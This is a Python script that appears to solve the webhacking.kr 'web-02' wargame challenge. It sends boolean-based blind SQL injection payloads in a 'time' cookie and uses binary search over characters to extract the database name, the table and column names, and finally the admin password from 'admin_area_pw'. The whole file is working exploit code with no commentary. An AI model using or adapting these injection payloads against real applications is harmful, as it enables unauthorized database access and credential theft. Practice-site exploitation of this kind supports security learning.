import requests

url = "https://webhacking.kr/challenge/web-02/"

def dbname_length():
    length = 1

    while True:
        cookies = { "PHPSESSID" : "쿠키값",
            "time" : "length((select database()))={}".format(length) }
        request = requests.get(url, cookies=cookies)

        if "09:00:01" in request.text:
            return length
        else:
            length += 1

def dbname_crack():
    db_length = dbname_length()
    dbname = ''

    for i in range(1, db_length+1):
        start, end, mid = 1, 127, 64
        while True:
            cookies = { "PHPSESSID" : "쿠키값",
                "time" : "if(hex(substring((select database()), {}, 1)={}),1,0)".format(i, hex(mid)) }
            request = requests.get(url, cookies=cookies)

            if "09:00:01" in request.text:
                dbname = dbname + chr(mid).lower()
                print("dbname:", dbname)
                break
            else:
                cookies = { "PHPSESSID" : "쿠키값",
                "time" : "if(hex(substring((select database()), {}, 1)>{}),1,0)".format(i, hex(mid)) }
                request = requests.get(url, cookies=cookies)

                if "09:00:01" in request.text:
                    start = mid
                    mid = (mid + end) // 2
                else:
                    end = mid
                    mid = (start + end) // 2

dbname_crack()

def table_name_length():
    length = 1

    while True:
        cookies = { "PHPSESSID" : "쿠키값",
            "time" : "length((select group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA='chall2'))={}".format(length) }
        request = requests.get(url, cookies=cookies)

        if "09:00:01" in request.text:
            return length
        else:
            length += 1

def table_name_crack():
    table_length = table_name_length()
    table_name = ''

    for i in range(1, table_length+1):
        start, end, mid = 1, 127, 64
        while True:
            cookies = { "PHPSESSID" : "쿠키값",
                "time" : "if(hex(substring((select group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA='chall2'), {}, 1)={}),1,0)".format(i, hex(mid)) }
            request = requests.get(url, cookies=cookies)

            if "09:00:01" in request.text:
                table_name = table_name + chr(mid).lower()
                print("테이블명:", table_name)
                break
            else:
                cookies = { "PHPSESSID" : "쿠키값",
                "time" : "if(hex(substring((select group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA='chall2'), {}, 1)>{}),1,0)".format(i, hex(mid)) }
                request = requests.get(url, cookies=cookies)

                if "09:00:01" in request.text:
                    start = mid
                    mid = (mid + end) // 2
                else:
                    end = mid
                    mid = (start + end) // 2

table_name_crack()

def column_name_length():
    length = 1

    while True:
        cookies = { "PHPSESSID" : "쿠키값",
            "time" : "length((select group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME='admin_area_pw'))={}".format(length) }
        request = requests.get(url, cookies=cookies)

        if "09:00:01" in request.text:
            return length
        else:
            length += 1

def column_name_crack():
    column_length = column_name_length()
    column_name = ''

    for i in range(1, column_length+1):
        start, end, mid = 1, 127, 64
        while True:
            cookies = { "PHPSESSID" : "쿠키값",
                "time" : "if(hex(substring((select group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME='admin_area_pw'), {}, 1)={}),1,0)".format(i, hex(mid)) }
            request = requests.get(url, cookies=cookies)

            if "09:00:01" in request.text:
                column_name = column_name + chr(mid).lower()
                print("컬럼명:", column_name)
                break
            else:
                cookies = { "PHPSESSID" : "쿠키값",
                "time" : "if(hex(substring((select group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME='admin_area_pw'), {}, 1)>{}),1,0)".format(i, hex(mid)) }
                request = requests.get(url, cookies=cookies)

                if "09:00:01" in request.text:
                    start = mid
                    mid = (mid + end) // 2
                else:
                    end = mid
                    mid = (start + end) // 2

column_name_crack()

def pw_length():
    length = 1

    while True:
        cookies = { "PHPSESSID" : "쿠키값",
            "time" : "length((select pw from admin_area_pw))={}".format(length) }
        request = requests.get(url, cookies=cookies)

        if "09:00:01" in request.text:
            return length
        else:
            length += 1

def pw_crack():
    password_length = pw_length()
    password = ''

    for i in range(1, password_length+1):
        start, end, mid = 1, 127, 64
        while True:
            cookies = { "PHPSESSID" : "쿠키값",
                "time" : "if(hex(substring((select pw from admin_area_pw), {}, 1)={}),1,0)".format(i, hex(mid)) }
            request = requests.get(url, cookies=cookies)

            if "09:00:01" in request.text:
                password = password + chr(mid).lower()
                print("패스워드:", password)
                break
            else:
                cookies = { "PHPSESSID" : "쿠키값",
                "time" : "if(hex(substring((select pw from admin_area_pw), {}, 1)>{}),1,0)".format(i, hex(mid)) }
                request = requests.get(url, cookies=cookies)

                if "09:00:01" in request.text:
                    start = mid
                    mid = (mid + end) // 2
                else:
                    end = mid
                    mid = (start + end) // 2

pw_crack()